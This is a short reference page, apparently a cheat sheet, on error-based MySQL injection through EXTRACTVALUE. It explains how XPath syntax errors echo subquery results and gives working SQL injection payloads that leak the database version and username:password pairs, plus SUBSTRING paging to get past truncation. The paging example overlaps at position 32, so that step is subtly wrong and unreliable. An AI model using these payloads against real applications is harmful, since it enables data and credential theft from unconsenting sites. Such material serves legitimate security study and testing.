---
title: "Error-based MySQL injection with EXTRACTVALUE"
description: "Leaking MySQL query results through XPath syntax errors raised by EXTRACTVALUE, including the 32-character truncation and how to page past it."
keywords:
  - EXTRACTVALUE
  - XPath syntax error
  - error based injection
  - MySQL data leak
  - subquery in error
---

# EXTRACTVALUE

`EXTRACTVALUE(xml_fragment, xpath_expression)` evaluates an XPath query against an XML string. When the XPath argument is not valid XPath, MySQL raises `XPATH syntax error: '<text>'` and includes the offending text verbatim. Building that text from a subquery leaks the subquery's result into the error.

The convention is to prefix the subquery with a character that cannot start a valid XPath step, such as `~` (`0x7e`), so the whole thing is rejected and echoed:

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- 
```

The response carries an error like `XPATH syntax error: '~8.0.36'`. Any single-row, single-value subquery works in the same slot:

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1)))-- 
```

The reflected text is capped near 32 characters, so longer values arrive truncated. Read them in windows with `SUBSTRING`:

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),1,32)))-- 
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),32,32)))-- 
```

A subquery that returns more than one row raises `Subquery returns more than 1 row` instead of the XPath error, so keep the inner query to one row with `LIMIT 1` or an aggregate.

## References

- MySQL Reference Manual: EXTRACTVALUE, SUBSTRING
- PortSwigger Web Security Academy: SQL injection cheat sheet
